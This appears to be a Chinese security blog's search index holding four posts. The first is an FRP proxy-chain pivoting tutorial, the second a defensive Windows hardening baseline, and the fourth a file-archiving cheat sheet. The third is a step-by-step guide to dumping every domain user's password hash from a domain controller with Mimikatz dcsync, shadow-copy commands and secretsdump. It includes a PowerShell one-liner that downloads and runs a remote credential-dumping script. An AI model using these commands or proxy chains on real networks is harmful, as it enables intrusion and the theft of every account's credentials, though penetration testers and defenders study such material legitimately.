<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[域渗透]FRP代理链]]></title>
    <url>%2F2020%2F12%2F22%2F%E5%9F%9F%E6%B8%97%E9%80%8F-FRP%E4%BB%A3%E7%90%86%E9%93%BE%2F</url>
    <content type="text"><![CDATA[使用FRP，建立多层代理链，突破内网限制 [内网渗透]FRP代理链一、实验环境 环境一 环境二 环境一：DMZ 区的靶机运行 Frpc1 连接 VPS，同时运行 Frps2，内网 A 的 PC1 运行 Frpc2 连接靶机环境二：DMZ 区的靶机运行 Frpc1 连接 VPS，内网 A 的 PC1 运行 Frps2，同时运行 Frpc2 连接本机 二、实验步骤环境一 VPS 上启动 Frps1 1Frps1.exe -c frps1.ini frps1.ini 配置如下 1234567891011121314[common]bind_addr = 0.0.0.0# 监听 7000 端口bind_port = 7000# 验证凭据，服务端和客户端的凭据⼀样auth_token = 123456789# 日志文件log_file = ./frps.loglog_level = infolog_max_days = 3# 允许端口allow_ports = 1080# 连接池上限max_pool_count = 50 DMZ 区服务器上启动 Frpc1，连接 VPS [192.168.10.16(模拟公网)] 1Frpc1.exe -c frpc1.ini frpc1.ini 配置如下 12345678910111213141516[common]server_addr = 192.168.10.16server_port = 7000auth_token = 123456789# 通信内容加密传输，防⽌流量被拦截use_encryption = true# 传输内容进⾏压缩，有效减⼩传输的⽹络流量，加快流量转发速度，但会额外消耗⼀些CPU资源use_compression = true[plugin_socks5]type = tcpremote_port = 1080plugin = socks5# 连接账密（可不带此参数）plugin_user = abcplugin_passwd = abc DMZ 区服务器上启动 Frps2，作为第二层代理链的 Server frps2.ini 配置与 VPS 的 frps1.ini 配置相同，根据实际网络环境选择监听端口 在内网A的 PC1 上启动 Frpc2，连接 DMZ 区服务器[192.168.20.10] frpc2.ini 配置与 DMZ 的 frpc1.ini 配置相同，根据实际网络环境选择连接端口 返回以下信息，说明连接成功 1232020/11/07 22:33:13 [I] [service.go:288] [01608f2e6713a1e6] login to server success, get run id [01608f2e6713a1e6], server udp port [0]2020/11/07 22:33:13 [I] [proxy_manager.go:144] [01608f2e6713a1e6] proxy added: [plugin_socks5]2020/11/07 22:33:13 [I] [control.go:180] [01608f2e6713a1e6] [plugin_socks5] start proxy success 在攻击机配置 Proxifier 的代理链 环境二 同环境一 同环境一 在内网 A 的 PC1 运行 Frps2，frps2.ini 配置如下 123456789[common]bind_addr = 0.0.0.0bind_port = 7000log_file = ./frps.loglog_level = infolog_max_days = 3auth_token = 123456789allow_ports = 1081max_pool_count = 50 在内网 A 的 PC1 运行 Frpc2，frpc2.ini 配置如下 12345678910111213[common]server_addr = 192.168.20.11server_port = 7000auth_token = 123456789use_encryption = trueuse_compression = true[plugin_socks5]type = tcpremote_port = 1081plugin = socks5plugin_user = abcplugin_passwd = abc 在攻击机配置 Proxifier 的代理链 与环境一不同，将第二层代理由 192.168.20.10:1081 改为 192.168.20.11:1081 三、实验结果两种建立代理链的方式均可从攻击机使用远程桌面登录内网 B 的 PC2 四、难点总结Q：Windows Server 2003，Windows XP 无法启动 FRP 怎么办？ A：高版本 GO语言不支持 2003 和 XP 系统，使用低版本的 FRP，实测 frp v0.24 可用 Q：如何探测端口连通性？ A：此处应有下一篇文章的跳转链接 Q：如何检测二层代理可用性？ A1：netstat -anop tcp 查看链接 A2：扫描第二层代理能通而第一层无法访问的主机端口]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>代理工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[安全加固]安全基线配置--windows篇]]></title>
    <url>%2F2019%2F12%2F15%2F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E9%85%8D%E7%BD%AE--windows%E7%AF%87%2F</url>
    <content type="text"><![CDATA[我曾经跨过山和大海，也穿过人山人海我曾经被挖过矿，也被勒过索我曾经加固防火墙，也重装了系统直到安全基线才是唯一的答案 一、什么是安全基线字典上对“基线”的解释是：一种在测量、计算或定位中的基本参照。如海岸基线，是水位到达的水位线。计算机中的安全基线是：系统最低安全要求的配置，常见的安全基线配置标准有ISO270001、等级保护2.0 二、安全基线配置常用快捷启动记录 名称 快捷启动( win + r ) 计算机管理 compmgmt.msc 本地安全策略 secpol.msc 事件查看器 eventvwr 本地组策略编辑器 gpedit.msc 系统配置实用程序 msconfig 1. 账号管理与授权 用户权限配置计算机管理–&gt;本地用户和组删除不需要的用户和组，让用户权限最小化 用户密码策略本地安全策略–&gt;账户策略–&gt;密码策略 选项 值 密码必须符合复杂性要求 已启用 密码长度最小值 8个字符 密码最短使用期限 1天 密码最长使用期限 90天 强制密码历史 5个记住的密码 用可还原的加密来储存密码 已禁用 用户锁定策略本地安全策略–&gt;账户策略–&gt;账户锁定策略 选项 值 账户锁定时间 5分钟 账户锁定阈值 6次无效登录 重置账户锁定计数器 5分钟后 权限分配本地安全策略–&gt;本地策略–&gt;用户权限分配 选项 值 从远程系统强制关机 删除除 administrators 以外的选项 关闭系统 删除除 administrators 以外的选项 允许本地登录 只保留授权用户 从网络访问此计算机 只保留授权用户 2. 日志配置要求 审核策略设置中的成功失败都要审核本地安全策略–&gt;本地策略–&gt;审核策略 选项 值 审核策略更改 成功和失败 审核登录时间 成功和失败 审核对象访问 成功和失败 审核过程跟踪 失败 审核目录服务访问 成功和失败 审核特权使用 成功和失败 审核系统事件 成功和失败 审核账户登录事件 成功和失败 审核账户管理 成功和失败 设置日志查看器大小描述：将应用程序、系统、安全日志查看器大小设置为至少 20480KB位置：管理工具–&gt;事件查看器设置：分别在应用程序、系统、安全上右键–&gt;属性，设置日志容量为 20480KB当达到最大日志大小时，“按需要覆盖事件”，并且用户有流程定期转存日志（备份日志） 高级安全审核–账户登录位置：本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;账户登录设置：将 “审核凭据验证” 设置为 “成功和失败” 高级安全审核–账户管理本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;账户管理 选项 值 审核计算机账户管理 成功和失败 审核其它账户管理事件 成功和失败 审核安全组管理 成功和失败 审核用户账户管理 成功和失败 高级安全审核–详细跟踪位置：本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;详细跟踪设置：将 “审核进程创建” 设置为 “成功” 高级安全审核–DS访问本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;DS访问 选项 值 审核目录服务访问 成功和失败 审核目录服务更改 成功和失败 高级安全审核–登录/注销本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;登录/注销 选项 值 审核注销 成功 审核登录 成功和失败 审核特殊登录 成功 高级安全审核–对象访问本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;对象访问 选项 值 审核文件系统 成功 审核注册表 失败 高级安全审核–策略更改本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;策略更改 选项 值 审核审核策略更改 成功和失败 审核身份验证策略更改 成功 高级安全审核–系统 本地组策略编辑器–&gt;计算机配置–&gt;windows设置–&gt;安全设置–&gt;高级安全审核策略配置–&gt;系统审核策略-本地组策略对象–&gt;系统 选项 值 审核IPsec驱动程序 成功和失败 审核安全状态更改 成功和失败 审核安全系统扩展 成功和失败 审核系统完整性 成功和失败 3. 安全选项配置本地安全策略–&gt;本地策略–&gt;安全选项 选项 值 Microsoft 网络服务器: 登录时间过期后断开与客户端的连接 已启用 Microsoft 网络服务器: 暂停会话前所需的空闲时间量 15分钟 关机: 清除虚拟内存页面文件 已禁用 关机: 允许系统在未登录的情况下关闭 已禁用 恢复控制台: 允许自动管理登录 已禁用 交互式登录: 不显示上次登录 已启用 交互式登录: 提示用户在密码过期之前更改密码 30天 交互式登录: 无需按 CTRL+ALT+DEL 已禁用 交互式登录: 需要 Windows Hello 企业版或智能卡 已禁用 交互式登录: 之前登录到缓存的次数(域控制器不可用时) 0次 交互式登录: 智能卡移除行为 锁定工作站 设备: 防止用户在连接共享打印机时安装打印机驱动程序 已启用 设备: 将 CD-ROM 的访问权限仅限于本地登录的用户 已启用 设备: 将软盘的访问权限仅限于本地登录的用户 已启用 设备: 允许对可移动媒体进行格式化并弹出 管理员 审核: 强制审核策略子类别设置(Windows Vista 或更高版本)可替代审核策略类别设置。 已启用 审核: 如果无法记录安全审核则立即关闭系统 已禁用 网络安全: LAN 管理器身份验证级别 仅发送NTLMv2响应，拒绝LM 网络安全: LDAP 客户端签名要求 协商签名 网络安全: 基于 NTLM SSP 的(包括安全 RPC)服务器的最小会话安全 要求 NTLMv2会话安全，要求128位加密 网络安全: 基于 NTLM SSP 的(包括安全 RPC)客户端的最小会话安全 要求 NTLMv2会话安全，要求128位加密 网络安全: 在下一次更改密码时不存储 LAN 管理器哈希值 已启用 网络访问: 本地帐户的共享和安全模型 经典 网络访问: 不允许匿名枚举 SAM 帐户 已启用 网络访问: 不允许 SAM 帐户和共享的匿名枚举 已启用 网络访问: 不允许存储网络身份验证的密码和凭据 已启用 网络访问: 将 Everyone 权限应用于匿名用户 已禁用 网络访问: 可匿名访问的共享 无定义 网络访问: 可匿名访问的命名管道 无定义 网络访问: 可远程访问的注册表路径 无 网络访问: 可远程访问的注册表路径和子路径 无 网络访问: 限制对命名管道和共享的匿名访问 已启用 网络访问: 允许匿名 SID/名称转换 已禁用 系统对象: 非 Windows 子系统不要求区分大小写 已启用 系统对象: 增强内部系统对象的默认权限(例如，符号链接) 已启用 系统加密: 为计算机上存储的用户密钥强制进行强密钥保护 用户每次使用密钥时必须输入密码 系统设置: 可选子系统 无 用户帐户控制: 标准用户的提升提示行为 自动拒绝提升请求 用户帐户控制: 在管理审批模式下管理员的提升提示行为 提示凭据 用户帐户控制: 检测应用程序安装和提示提升 已启用 用户帐户控制: 将文件及注册表写入失败虚拟化到每用户位置 已启用 用户帐户控制: 仅提升安装在安全位置的 UIAccess 应用程序 已启用 用户帐户控制: 提示提升时切换到安全桌面 已启用 用户帐户控制: 启用管理审批模式 已启用 用户帐户控制: 对内置管理员帐户使用管理审批模式 已启用 帐户: 来宾帐户状态 已禁用 帐户: 使用空密码的本地帐户只允许进行控制台登录 已启用 4. 服务配置要求 启动 NTP 服务描述：启用 NTP 服务，配置统一服务器时钟，开启 NTP 服务向网络内指定的 NTP server 同步时钟对于已加入域的服务器：系统将自动与域控服务器同步时钟对于未加入域的服务器：控制面板–&gt;日期和时间–&gt;Internet时间，开启 “自动与Internet时间服务器同步”，填写 NTP 服务器IP，点击立即更新 禁用无用的服务运行–&gt;services.msc，检查以下服务是否关闭 服务名称 描述 server 共享 Remote Registry 远程管理注册表 Print Spooler 打印 Distributed Link Tracking Client 局域网更新连接信息 TCP/IP NetBIOS Helper Workstation IP Helper IPv6 Windows Remote Management (WS-Management) 远程管理 关闭不需要的启动项 运行–&gt;msconfig–&gt;启动，查看启动项，关闭不需要的启动项 关闭自动播放描述：关闭自动播放功能，防止插入U盘时，自动启动恶意程序位置：控制面板–&gt;自动播放设置：取消 “为所有媒体和设备使用自动播放” 审查 host 文件描述：系统首先从Hosts文件中寻找对应的IP地址位置：C:\Windows\System32\drivers\etc\hosts设置：审查该文件是否有可疑的 域名-IP 对应关系，如有可疑配置，最好进行溯源操作 5. 其它配置要求 升级杀毒软件，更新病毒库 安装最新 service pack 补丁包 设置屏幕保护，等待时间5分钟，恢复时使用密码 开启 windows 防火墙，查看入站/出站规则，正确设置网络访问控制策略 关闭远程桌面]]></content>
      <categories>
        <category>防御</category>
      </categories>
      <tags>
        <tag>安全加固</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[域渗透]导出域用户Hash方法总结]]></title>
    <url>%2F2019%2F09%2F03%2F%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%AF%BC%E5%87%BA%E5%9F%9F%E7%94%A8%E6%88%B7Hash%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在拥有域管权限时，可以提取所有域用户的密码Hash，为下一步渗透做准备。 一、如何 Dump HashHash 值存储在域控制器中（C:\Windows\NTDS\NTDS.DIT）NTDS.DIT 文件经常被操作系统使用，无法直接复制到其它位置。可尝试以下方法 Dump Hash。 1. MimikatzMimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码 Hash 值。 需要权限：域管权限Mimikatz 需免杀 12345# 所有用户Mimikatz &quot;lsadump::dcsync /domain:test.com /all /csv&quot; exit &gt; hash.txt# 指定用户Mimikatz &quot;lsadump::dcsync /domain:test.com /user:username&quot; exit &gt; hash.txt 2. NtdsutilNtdsutil 域控制器默认安装，使管理员能访问和管理 Windows Active Directory 数据库。渗透测试中可以用它来拍摄 ntds.dit 文件的快照 需要权限：域管权限 12345678910111213141516171819# 创建快照ntdsutil snapshot &quot;activate instance ntds&quot; create quit quitGUID 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;# 挂载快照ntdsutil snapshot &quot;mount GUID&quot; quit quit# 复制 ntds.ditcopy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit# 卸载快照ntdsutil snapshot &quot;unmount GUID&quot; quit quit# 删除快照ntdsutil snapshot &quot;delete GUID&quot; quit quit# 查询快照ntdsutil snapshot &quot;List All&quot; quit quitntdsutil snapshot &quot;List Mounted&quot; quit quit 3. Vssadmin域控制器默认安装 需要权限：域管权限 12345678910111213# 查询当前系统的快照vssadmin list shadows# 创建快照vssadmin create shadow /for=c: /autoretry=10&quot;Shadow Copy Volume Name&quot; 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1&quot;Shadow Copy ID&quot; 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;# 复制 ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit# 删除快照vssadmin delete shadows /for=c: /quiet 4. DiskshadowDiskShadow 是由微软官方签名的，Windows Server 2008、2012、2016 都包含了 DiskShadow，所在目录C:\windows\system32\diskshadow.exe。包含交互式命令和脚本模式。 下面利用脚本模式提取AD数据库123456# 查看存放 `ntds.dit` 的逻辑驱动器（一般为 C 盘）# 找出系统没有使用的逻辑驱动器号wmic logicaldisk# 调用脚本C:\windows\system32\diskshadow.exe /s C:\shadow.txt shadow.txt 内容1234567set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% z:exec &quot;C:\windows\system32\cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\ntds.ditdelete shadows volume %someAlias%reset 5. Powershell项目地址：https://github.com/EmpireProject/Empire12# 远程加载 Invoke-DCSync.ps1powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-DCSync.ps1')";Invoke-DCSync -PWDumpFormat &gt; hash.txt 二、如何从 ntds.dit 提取 Hash1. NTDSDumpEx12345678910usage: ntdsdumpex.exe &lt;-d ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv |-r&gt; [-o out.txt] [-h] [-m] [-p] [-u]-d path of ntds.dit database-k use specified SYSKEY-s parse SYSKEY from specified system.hiv-r read SYSKEY from registry-o write output into-h dump hash histories(if available)-p dump description and path of home directory-m dump machine accounts-u USE UPPER-CASE-HEX 123# 离线模式：先导出注册表reg save hklm\system system.hivNTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt 12# 在线模式：无需导出注册表NTDSDumpEx.exe -d ntds.dit -r -o hash.txt 2. Impacket项目地址：https://github.com/SecureAuthCorp/impacket 因为 Kali 的 python 环境安装得比较全，所以使用 Kali 来解 Hash1git clone https://github.com/SecureAuthCorp/impacket 123# 安装所需库 pip install .python setup.py 12# 使用 secretsdump.py 解 Hash/impacket/examples# python secretsdump.py -ntds /home/workspace/hash/ntds.dit -system /home/workspace/hash/sys.hiv LOCAL &gt; /home/workspace/hash/hash.txt 三、总结 Mimikatz 在域用户机器执行需要域管权限时，可使用 psexec、计划任务等远程执行 使用 Ntdsutil、Vssadmin 等卷影拷贝工具时，需要先开启 Volume Shadow Copy Service 服务 有时遇到 NTDSDumpEx 提取出错，可以尝试修复 ntds.dit，修复后还无法提取，则使用 secretsdump.py。缺点：比较耗时 四、参考文章Dump域内用户Hash姿势集合域渗透——获得域控服务器的NTDS.dit文件NTDS.dit密码快速提取工具]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>系统工具</tag>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速打包系统文件]]></title>
    <url>%2F2019%2F05%2F09%2F%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[在传输速度有限制的情况下，快速压缩大文件能大大提升效率，为下一步的分析工作赢得时间 一、Windows1. 7z支持格式：7z，ZIP，XZ，BZIP2，GZIP，TAR 1234567 a 压缩包名称 e 解压文件-t 压缩类型，如 -tzip，默认 7z-r 递归压缩-p 指定密码，如 -p123456-v 分卷压缩，单位 b|k|m|g-o 输出目录 压缩12345# 单个文件7z.exe a filename.7z -p123456 -v100m filename.txt# 递归压缩文件夹7z.exe a filename.7z -p123456 -r dir_path 解压注意： -o 参数末尾最好不要以 \ 结束 17z.exe -e filename.7z -p123456 -oc:\temp 2. WinRAR提取 winRAR 安装目录中的 rar.exe 即可使用注意： 在 32 位系统运行完毕会报错，不懂为何 12345678 a 文件名 -a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-v 分卷压缩，单位 b|k|m|g-m3 标准(默认)-m4 较好(较高的压缩比) -m5 最优(最高压缩比,速度最慢) 12345678# 单个文件rar.exe a filename.rar -p123456 -m4 -a filename.txt# 文件夹rar.exe a filename.rar -p123456 -m5 -r -a dir_path# 分卷压缩rar.exe a filename.rar -p123456 -m4 -v100m -a filename.txt 二、Linux1.Tar1234567891011-z 是否同时具有gz属性-j 是否同时具有bz2属性-J 是否同时具有xz属性-c 建立一个压缩文档-x 解压缩-t 查看压缩包内容-C 指定输出目录-v 显示压缩或者打包的内容-f 文件名，-f参数在使用的时候一定排在其他参数的后面-p 保留备份数据的原本权限与属性-P 保留绝对路径 压缩123456789101112# 普通压缩tar -czvf /path/file.tar.gz 123.txt&lt;# 分卷压缩 “-“号是 tar 的 ouput 和 split 的 input 的参数 完成后生成 file.tar.gz.aa、file.tar.gz.ab、file.tar.gz.ac #&gt;tar -czvf - file.iso|split -b 100m - file.tar.gz.# 加密压缩tar -czvf - file | openssl des3 -salt -k password -out /path/file.tar.gz 解压12345678# 普通解压tar -xzvf /path/file.tar.gz /path# 分卷解压cat file.tar.gz.a* | tar xz# 解密解压openssl des3 -d -k password -salt -in /path/file.tar.gz | tar xzf -]]></content>
      <tags>
        <tag>小工具</tag>
      </tags>
  </entry>
</search>
